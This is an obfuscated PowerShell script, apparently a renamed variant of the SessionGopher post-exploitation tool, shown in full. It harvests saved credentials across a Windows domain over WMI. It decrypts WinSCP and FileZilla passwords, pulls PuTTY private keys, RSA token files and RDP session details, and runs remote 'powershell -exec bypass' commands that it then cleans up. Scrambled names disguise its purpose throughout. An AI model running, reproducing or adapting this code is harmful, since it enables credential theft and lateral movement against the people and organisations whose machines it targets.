function fitted {
  Write-Output '
          o_       
       ,"  _-"      
     ,"   m m         
  '
  if ($o) {
    $CkVstpcs99 = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $CkVstpcs99 | Out-Null
    New-Item ($CkVstpcs99 + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($CkVstpcs99 + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($CkVstpcs99 + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($CkVstpcs99 + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($CkVstpcs99 + "\RDP.csv") -Type File | Out-Null
    if ($DCCuGVpg99) {
        New-Item ($CkVstpcs99 + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($CkVstpcs99 + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($CkVstpcs99 + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }
  if ($u -and $p) {
    $xKpPGjOO99 = ConvertTo-SecureString $p -AsPlainText -Force
    $CBkvYLqd99 = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $u, $xKpPGjOO99
  }
  $HKU = 2147483651
  $HKLM = 2147483650
  $NMBCqPIJ99 = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $jsdfRYVu99 = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $mFPJNZzn99 = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
  if ($iL -or $JKoVlknq99 -or $avwqwqjX99) {
    $vuWqhYay99 = ""
    if ($JKoVlknq99) {
      $vuWqhYay99 = sane
    } elseif ($iL) { 
      $vuWqhYay99 = Get-Content ((Resolve-Path $iL).Path)
    } elseif ($avwqwqjX99) {
      $vuWqhYay99 = $avwqwqjX99
    }
    $qfmWHrwT99 = @{}
    if ($CBkvYLqd99) {
      $qfmWHrwT99['Credential'] = $CBkvYLqd99
    }
    foreach ($wtbSrSpx99 in $vuWqhYay99) {
      if ($JKoVlknq99) {
        $wtbSrSpx99 = $wtbSrSpx99.Properties.name
        if (!$wtbSrSpx99) { Continue }
      }
      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $wtbSrSpx99"..."
      $SIDS = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $wtbSrSpx99 @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
      foreach ($SID in $SIDs) {
        $ErWpkSiQ99 = try { (Split-Path -Leaf (Split-Path -Leaf (unprecedented))) } catch {}
        $HQlCQNqH99 = (($wtbSrSpx99 + "\" + $ErWpkSiQ99) -Join "")
        $PDqaVvTV99 = New-Object PSObject
        $zXjXZjxv99 = New-Object System.Collections.ArrayList
        $MKjexntz99 = New-Object System.Collections.ArrayList
        $jCxNMcmT99 = New-Object System.Collections.ArrayList
        $BoHftNUb99 = New-Object System.Collections.ArrayList
        $wzZKPZEo99 = New-Object System.Collections.ArrayList
        $zcGjqHGA99 = $SID + $mFPJNZzn99
        $dcHjmREh99 = $SID + $NMBCqPIJ99
        $FNbxUCJm99 = $SID + $jsdfRYVu99
        $tabuqHhX99 = "Drive='C:' AND Path='\\Users\\$ErWpkSiQ99\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $yFZynMrg99 = "Drive='C:' AND Path='\\Users\\$ErWpkSiQ99\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
        $QwzWCeiS99 = Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$zcGjqHGA99 @optionalCreds
        $PmuOyzUi99 = Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$dcHjmREh99 @optionalCreds
        $biyDmqMt99 = Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$FNbxUCJm99 @optionalCreds
        $NoNrhZGp99 = (Get-WmiObject -Class 'CIM_DataFile' -Filter $tabuqHhX99 -ComputerName $wtbSrSpx99 @optionalCreds | Select Name)
        $IFuDxvAo99 = (Get-WmiObject -Class 'CIM_DataFile' -Filter $yFZynMrg99 -ComputerName $wtbSrSpx99 @optionalCreds | Select Name)
        if (($biyDmqMt99 | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          $biyDmqMt99 = $biyDmqMt99 | Select-Object -ExpandProperty sNames
          
          foreach ($yCSHsRYI99 in $biyDmqMt99) {
      
            $ykblWpXS99 = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $ykblWpXS99.Source = $HQlCQNqH99
            $ykblWpXS99.Session = $yCSHsRYI99
            $ihYTHafR99 = $FNbxUCJm99 + "\" + $yCSHsRYI99
            $ykblWpXS99.Hostname = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$ihYTHafR99,"HostName" @optionalCreds).sValue
            $ykblWpXS99.Username = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$ihYTHafR99,"UserName" @optionalCreds).sValue
            $ykblWpXS99.Password = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$ihYTHafR99,"Password" @optionalCreds).sValue
            if ($ykblWpXS99.Password) {
              $WwAdIViV99 = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $RJtiIxlP99 = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$WwAdIViV99,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$RJtiIxlP99) {
                  $ykblWpXS99.Password = (DecryptWinSCPPassword $ykblWpXS99.Hostname $ykblWpXS99.Username $ykblWpXS99.Password)
              } else {
                  $ykblWpXS99.Password = "Saved in session, but master password prevents plaintext recovery"
              }
            }
             
            [void]$wzZKPZEo99.Add($ykblWpXS99)
      
          } # For Each WinSCP Session
          if ($wzZKPZEo99.count -gt 0) {
            $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $wzZKPZEo99
            if ($o) {
              $wzZKPZEo99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $wzZKPZEo99 | Select-Object * | Format-List | Out-String
            }
          }
        
        } # If path to WinSCP exists
        if (($PmuOyzUi99 | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          $PmuOyzUi99 = $PmuOyzUi99 | Select-Object -ExpandProperty sNames
          foreach ($VaGNqKbx99 in $PmuOyzUi99) {
      
            $dtQFqGjd99 = "" | Select-Object -Property Source,Session,Hostname
            $ihYTHafR99 = $dcHjmREh99 + "\" + $VaGNqKbx99
            $dtQFqGjd99.Source = $HQlCQNqH99
            $dtQFqGjd99.Session = $VaGNqKbx99
            $dtQFqGjd99.Hostname = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$ihYTHafR99,"HostName" @optionalCreds).sValue
             
            [void]$zXjXZjxv99.Add($dtQFqGjd99)
      
          }
          if ($zXjXZjxv99.count -gt 0) {
            $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $zXjXZjxv99
            if ($o) {
              $zXjXZjxv99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $zXjXZjxv99 | Select-Object * | Format-List | Out-String
            }
          }
        } # If PuTTY session exists
        if (($QwzWCeiS99 | Select-Object -ExpandPropert ReturnValue) -eq 0) {
          $QwzWCeiS99 = $QwzWCeiS99 | Select-Object -ExpandProperty sNames
          foreach ($KDzjaufC99 in $QwzWCeiS99) {
      
            $qYzGrScV99 = "" | Select-Object -Property Source,Hostname,Username
            
            $ihYTHafR99 = $zcGjqHGA99 + "\" + $KDzjaufC99
            $qYzGrScV99.Source = $HQlCQNqH99
            $qYzGrScV99.Hostname = $KDzjaufC99
            $qYzGrScV99.Username = (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$ihYTHafR99,"UserNameHint" @optionalCreds).sValue
            [void]$jCxNMcmT99.Add($qYzGrScV99)
      
          }
          if ($jCxNMcmT99.count -gt 0) {
            $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $jCxNMcmT99
            if ($o) {
              $jCxNMcmT99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $jCxNMcmT99 | Select-Object * | Format-List | Out-String
            }
          }
        } # If RDP sessions exist
        if ($NoNrhZGp99.Name) {
          $File = "C:\Users\$ErWpkSiQ99\Documents\SuperPuTTY\Sessions.xml"
          $svlPQNoh99 = DownloadAndExtractFromRemoteRegistry $File
          [xml]$qoCdorKk99 = $svlPQNoh99
          (ProcessSuperPuTTYFile $qoCdorKk99)
        }
        if ($IFuDxvAo99.Name) {
          $File = "C:\Users\$ErWpkSiQ99\AppData\Roaming\FileZilla\sitemanager.xml"
          $svlPQNoh99 = DownloadAndExtractFromRemoteRegistry $File
          [xml]$eVlRHXon99 = $svlPQNoh99
          (ProcessFileZillaFile $eVlRHXon99)
        } # FileZilla
      } # for each SID
      if ($DCCuGVpg99) {
        $yiAFvVOf99 = New-Object System.Collections.ArrayList
        $MRsviEXd99 = New-Object System.Collections.ArrayList
        $ichDpOdg99 = New-Object System.Collections.ArrayList
        $ktpBFhDI99 = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $wtbSrSpx99 @optionalCreds | Select Name)
        (ProcessThoroughRemote $ktpBFhDI99)
        
      } 
    } # for each remote computer
  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."
    $rAKSPOvq99 = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
    foreach($Hive in $rAKSPOvq99) {
      $PDqaVvTV99 = New-Object PSObject
      $wzZKPZEo99 = New-Object System.Collections.ArrayList
      $zXjXZjxv99 = New-Object System.Collections.ArrayList
      $yiAFvVOf99 = New-Object System.Collections.ArrayList
      $MKjexntz99 = New-Object System.Collections.ArrayList
      $jCxNMcmT99 = New-Object System.Collections.ArrayList
      $MRsviEXd99 = New-Object System.Collections.ArrayList
      $BoHftNUb99 = New-Object System.Collections.ArrayList
      $AaGuAMht99 = (unprecedented)
      $HQlCQNqH99 = (Hostname) + "\" + (Split-Path $AaGuAMht99.Value -Leaf)
      $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "Source" -Value $AaGuAMht99.Value
      $dcHjmREh99 = Join-Path $Hive.PSPath "\$NMBCqPIJ99"
      $FNbxUCJm99 = Join-Path $Hive.PSPath "\$jsdfRYVu99"
      $vdKaJWVS99 = Join-Path $Hive.PSPath "\$mFPJNZzn99"
      $IFuDxvAo99 = "C:\Users\" + (Split-Path -Leaf $PDqaVvTV99."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $NoNrhZGp99 = "C:\Users\" + (Split-Path -Leaf $PDqaVvTV99."Source") + "\Documents\SuperPuTTY\Sessions.xml"
      if (Test-Path $IFuDxvAo99) {
        [xml]$eVlRHXon99 = Get-Content $IFuDxvAo99
        (ProcessFileZillaFile $eVlRHXon99)
      }
      if (Test-Path $NoNrhZGp99) {
        [xml]$qoCdorKk99 = Get-Content $NoNrhZGp99
        (ProcessSuperPuTTYFile $qoCdorKk99)
      }
      if (Test-Path $vdKaJWVS99) {
        $lVQwOQqV99 = Get-ChildItem $vdKaJWVS99
        (ProcessRDPLocal $lVQwOQqV99)
      } # If (Test-Path MicrosoftRDPPath)
      if (Test-Path $FNbxUCJm99) {
        $oTozeWGo99 = Get-ChildItem $FNbxUCJm99
        (ProcessWinSCPLocal $oTozeWGo99)
      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $dcHjmREh99) {
        $KKvzKmay99 = Get-ChildItem $dcHjmREh99
        (ProcessPuTTYLocal $KKvzKmay99)
      } # If (Test-Path PuTTYPath)
    } # For each Hive in UserHives
    if ($DCCuGVpg99) {
      $NAggkSiZ99 = New-Object System.Collections.ArrayList
      $KzxVPmMJ99 = New-Object System.Collections.ArrayList
      $CZhQTrOz99 = New-Object System.Collections.ArrayList
      $jheMWnzz99 = Get-PSDrive
      (ProcessThoroughLocal $jheMWnzz99)
      
      (ProcessPPKFile $NAggkSiZ99)
      (ProcessRDPFile $KzxVPmMJ99)
      (ProcesssdtidFile $CZhQTrOz99)
    } # If Thorough
  } # Else -- run SessionGopher locally
} # fitted
function unprecedented {
  if ($iL -or $avwqwqjX99 -or $JKoVlknq99) {
    $FmsswwTo99 = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"
    return (Invoke-WmiMethod -ComputerName $wtbSrSpx99 -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$FmsswwTo99,$Value @optionalCreds).sValue
  } else {
    $SID = (Split-Path $Hive.Name -Leaf)
    $RBNzYDaf99 = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    return $RBNzYDaf99.Translate( [System.Security.Principal.NTAccount])
  }
}
function DownloadAndExtractFromRemoteRegistry($File) {
  $XAcNERpr99 = "HKLM:\Software\Microsoft\DRM"
  $UtNNfjgW99 = "ReadMe"
  $uchrQahz99 = "SOFTWARE\Microsoft\DRM"
          
  Write-Verbose "Reading remote file and writing on remote registry"
  $OGxVabbK99 = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $adMARdIz99 = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$XAcNERpr99'" + ' -Name ' + "'$UtNNfjgW99'" + ' -Value $adMARdIz99 -PropertyType String -Force'
  $OGxVabbK99 = 'powershell -nop -exec bypass -c "' + $OGxVabbK99 + '"'
  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $OGxVabbK99 -ComputerName $wtbSrSpx99 @optionalCreds
  Start-Sleep -s 15
  $TxJlgmSk99 = ""
  $TxJlgmSk99 = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $uchrQahz99, $UtNNfjgW99 -Computer $wtbSrSpx99 @optionalCreds
  
  $gJHkOVPy99 = [System.Convert]::FromBase64String($TxJlgmSk99.sValue)
  $ejmDmVGq99 = [System.Text.Encoding]::UTF8.GetString($gJHkOVPy99) 
    
  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $gCxSKqrP99, $uchrQahz99, $UtNNfjgW99 -ComputerName $wtbSrSpx99 @optionalCreds
  
  return $ejmDmVGq99
}
function ProcessThoroughLocal($jheMWnzz99) {
  
  foreach ($Drive in $jheMWnzz99) {
    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$NAggkSiZ99.Add($Dir)}
          ".rdp" {[void]$KzxVPmMJ99.Add($Dir)}
          ".sdtid" {[void]$CZhQTrOz99.Add($Dir)}
        }
      }
    }
  }
}
function ProcessThoroughRemote($ktpBFhDI99) {
  foreach ($hAHNboij99 in $ktpBFhDI99) {
      $atsZSafG99 = "" | Select-Object -Property Source,Path
      $atsZSafG99.Source = $wtbSrSpx99
      $AdARxXWm99 = [IO.Path]::GetExtension($hAHNboij99.Name)
      if ($AdARxXWm99 -eq ".ppk") {
        $atsZSafG99.Path = $hAHNboij99.Name
        [void]$yiAFvVOf99.Add($atsZSafG99)
      } elseif ($AdARxXWm99 -eq ".rdp") {
        $atsZSafG99.Path = $hAHNboij99.Name
        [void]$MRsviEXd99.Add($atsZSafG99)
      } elseif ($AdARxXWm99 -eq ".sdtid") {
        $atsZSafG99.Path = $hAHNboij99.Name
        [void]$ichDpOdg99.Add($atsZSafG99)
      }
  }
  if ($yiAFvVOf99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $MRsviEXd99
    if ($o) {
      $yiAFvVOf99 | Export-CSV -Append -Path ($CkVstpcs99 + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $yiAFvVOf99 | Format-List | Out-String
    }
  }
  if ($MRsviEXd99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $MRsviEXd99
    if ($o) {
      $MRsviEXd99 | Export-CSV -Append -Path ($CkVstpcs99 + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $MRsviEXd99 | Format-List | Out-String
    }
  }
  if ($ichDpOdg99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ichDpOdg99
    if ($o) {
      $ichDpOdg99 | Export-CSV -Append -Path ($CkVstpcs99 + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ichDpOdg99 | Format-List | Out-String
    }
  }
} # ProcessThoroughRemote
function ProcessPuTTYLocal($KKvzKmay99) {
  
  foreach($cUxNBEGm99 in $KKvzKmay99) {
    $dtQFqGjd99 = "" | Select-Object -Property Source,Session,Hostname
    $dtQFqGjd99.Source = $HQlCQNqH99
    $dtQFqGjd99.Session = (Split-Path $cUxNBEGm99 -Leaf)
    $dtQFqGjd99.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $cUxNBEGm99) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    [void]$zXjXZjxv99.Add($dtQFqGjd99)
  }
  if ($o) {
    $zXjXZjxv99 | Export-CSV -Append -Path ($CkVstpcs99 + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $zXjXZjxv99 | Format-List | Out-String
  }
  $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $zXjXZjxv99
} # ProcessPuTTYLocal
function ProcessRDPLocal($lVQwOQqV99) {
  foreach($cUxNBEGm99 in $lVQwOQqV99) {
    $teKfSTiK99 = "Microsoft.PowerShell.Core\Registry::" + $cUxNBEGm99
    $XJCylEmn99 = "" | Select-Object -Property Source,Hostname,Username
    $XJCylEmn99.Source = $HQlCQNqH99
    $XJCylEmn99.Hostname = (Split-Path $cUxNBEGm99 -Leaf)
    $XJCylEmn99.Username = ((Get-ItemProperty -Path $teKfSTiK99 -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)
    [void]$jCxNMcmT99.Add($XJCylEmn99)
  } # For each Session in AllRDPSessions
  if ($o) {
    $jCxNMcmT99 | Export-CSV -Append -Path ($CkVstpcs99 + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $jCxNMcmT99 | Format-List | Out-String
  }
  $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $jCxNMcmT99
} #ProcessRDPLocal
function ProcessWinSCPLocal($oTozeWGo99) {
  
  foreach($cUxNBEGm99 in $oTozeWGo99) {
    $MzHIaYPU99 = "Microsoft.PowerShell.Core\Registry::" + $cUxNBEGm99
    $ykblWpXS99 = "" | Select-Object -Property Source,Session,Hostname,Username,Password
    $ykblWpXS99.Source = $HQlCQNqH99
    $ykblWpXS99.Session = (Split-Path $cUxNBEGm99 -Leaf)
    $ykblWpXS99.Hostname = ((Get-ItemProperty -Path $MzHIaYPU99 -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $ykblWpXS99.Username = ((Get-ItemProperty -Path $MzHIaYPU99 -Name "Username" -ErrorAction SilentlyContinue).Username)
    $ykblWpXS99.Password = ((Get-ItemProperty -Path $MzHIaYPU99 -Name "Password" -ErrorAction SilentlyContinue).Password)
    if ($ykblWpXS99.Password) {
      $RJtiIxlP99 = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)
      if (!$RJtiIxlP99) {
          $ykblWpXS99.Password = (DecryptWinSCPPassword $ykblWpXS99.Hostname $ykblWpXS99.Username $ykblWpXS99.Password)
      } else {
          $ykblWpXS99.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }
    [void]$wzZKPZEo99.Add($ykblWpXS99)
  } # For each Session in AllWinSCPSessions
  if ($o) {
    $wzZKPZEo99 | Export-CSV -Append -Path ($CkVstpcs99 + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $wzZKPZEo99 | Format-List | Out-String
  }
  $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $wzZKPZEo99
} # ProcessWinSCPLocal
function ProcesssdtidFile($CZhQTrOz99) {
  foreach ($Path in $CZhQTrOz99.VersionInfo.FileName) {
    $ADaEqkKI99 = "" | Select-Object -Property "Source","Path"
    $ADaEqkKI99."Source" = $HQlCQNqH99
    $ADaEqkKI99."Path" = $Path
    [void]$ichDpOdg99.Add($ADaEqkKI99)
  }
  if ($ichDpOdg99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $ichDpOdg99
    if ($o) {
      $ichDpOdg99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ichDpOdg99 | Select-Object * | Format-List | Out-String
    }
  }
} # Process sdtid File
function ProcessRDPFile($KzxVPmMJ99) {
  
  foreach ($Path in $KzxVPmMJ99.VersionInfo.FileName) {
    
    $SOuYLNGM99 = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
    $SOuYLNGM99."Source" = (Hostname)
    $SOuYLNGM99."Path" = $Path 
    $SOuYLNGM99."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $SOuYLNGM99."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $SOuYLNGM99."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $SOuYLNGM99."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    if (!$SOuYLNGM99."Administrative Session" -or !$SOuYLNGM99."Administrative Session" -eq 0) {
      $SOuYLNGM99."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $SOuYLNGM99."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$SOuYLNGM99."Prompts for Credentials" -or $SOuYLNGM99."Prompts for Credentials" -eq 0) {
      $SOuYLNGM99."Prompts for Credentials" = "No"
    } else {
      $SOuYLNGM99."Prompts for Credentials" = "Yes"
    }
    [void]$MRsviEXd99.Add($SOuYLNGM99)
  }
  if ($MRsviEXd99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $MRsviEXd99
    if ($o) {
      $MRsviEXd99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $MRsviEXd99 | Select-Object * | Format-List | Out-String
    }
  }
} # Process RDP File
function ProcessPPKFile($NAggkSiZ99) {
  foreach ($Path in $NAggkSiZ99.VersionInfo.FileName) {
    $xlFnEsfr99 = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"
    $xlFnEsfr99."Source" = (Hostname)
    $xlFnEsfr99."Path" = $Path
    $xlFnEsfr99."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $xlFnEsfr99."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $xlFnEsfr99."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $AdVHluZz99 = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $xlFnEsfr99."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$AdVHluZz99).Context.PostContext -Join "" } catch {}
    $xlFnEsfr99."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}
    [void]$yiAFvVOf99.Add($xlFnEsfr99)
  }
  if ($yiAFvVOf99.count -gt 0) {
    $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $yiAFvVOf99
    if ($o) {
      $yiAFvVOf99 | Select-Object * | Export-CSV -Append -Path ($CkVstpcs99 + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $yiAFvVOf99 | Select-Object * | Format-List | Out-String
    }
  }
} # Process PPK File
function ProcessFileZillaFile($eVlRHXon99) {
  foreach($gryVfcLJ99 in $eVlRHXon99.SelectNodes('//FileZilla3/Servers/Server')) {
      $hwlZSvML99 = @{}
      $gryVfcLJ99.ChildNodes | ForEach-Object {
          $hwlZSvML99["Source"] = $HQlCQNqH99
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $hwlZSvML99["Password"] = $_.InnerText
              } else {
                  $hwlZSvML99[$_.Name] = $_.InnerText
              }
              
          }
      }
    [void]$BoHftNUb99.Add((New-Object PSObject -Property $hwlZSvML99 | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  
  foreach ($cUxNBEGm99 in $BoHftNUb99) {
      $cUxNBEGm99.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cUxNBEGm99.Password))
      if ($cUxNBEGm99.Protocol -eq "0") {
        $cUxNBEGm99.Protocol = "Use FTP over TLS if available"
      } elseif ($cUxNBEGm99.Protocol -eq 1) {
        $cUxNBEGm99.Protocol = "Use SFTP"
      } elseif ($cUxNBEGm99.Protocol -eq 3) {
        $cUxNBEGm99.Protocol = "Require implicit FTP over TLS"
      } elseif ($cUxNBEGm99.Protocol -eq 4) {
        $cUxNBEGm99.Protocol = "Require explicit FTP over TLS"
      } elseif ($cUxNBEGm99.Protocol -eq 6) {
        $cUxNBEGm99.Protocol = "Only use plain FTP (insecure)"
      } 
  }
  if ($o) {
    $BoHftNUb99 | Export-CSV -Append -Path ($CkVstpcs99 + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $BoHftNUb99 | Format-List | Out-String
  }
  $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -Value $BoHftNUb99
} # ProcessFileZillaFile
function ProcessSuperPuTTYFile($qoCdorKk99) {
  foreach($KigRXonL99 in $qoCdorKk99.ArrayOfSessionData.SessionData) {
    foreach ($whydrIOZ99 in $KigRXonL99) { 
      if ($whydrIOZ99 -ne $null) {
        $OaosviZH99 = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
        $OaosviZH99."Source" = $HQlCQNqH99
        $OaosviZH99."SessionId" = $whydrIOZ99.SessionId
        $OaosviZH99."SessionName" = $whydrIOZ99.SessionName
        $OaosviZH99."Host" = $whydrIOZ99.Host
        $OaosviZH99."Username" = $whydrIOZ99.Username
        $OaosviZH99."ExtraArgs" = $whydrIOZ99.ExtraArgs
        $OaosviZH99."Port" = $whydrIOZ99.Port
        $OaosviZH99."PuTTY Session" = $whydrIOZ99.PuttySession
        [void]$MKjexntz99.Add($OaosviZH99)
      } 
    }
  } # ForEach SuperPuTTYSessions
  if ($o) {
    $MKjexntz99 | Export-CSV -Append -Path ($CkVstpcs99 + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $MKjexntz99 | Out-String
  }
  $PDqaVvTV99 | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -Value $MKjexntz99
} # ProcessSuperPuTTYFile
function sane {
  $hPooAUpV99 = "computer"
  $mUlYHMOm99 = New-Object System.DirectoryServices.DirectoryEntry
  $dbiDkrLM99 = New-Object System.DirectoryServices.DirectorySearcher
  $dbiDkrLM99.SearchRoot = $mUlYHMOm99
  $dbiDkrLM99.Filter = ("(objectCategory=$hPooAUpV99)")
  $nPFdVEwP99 = "name"
  foreach ($i in $nPFdVEwP99){$dbiDkrLM99.PropertiesToLoad.Add($i)}
  return $dbiDkrLM99.FindAll()
}
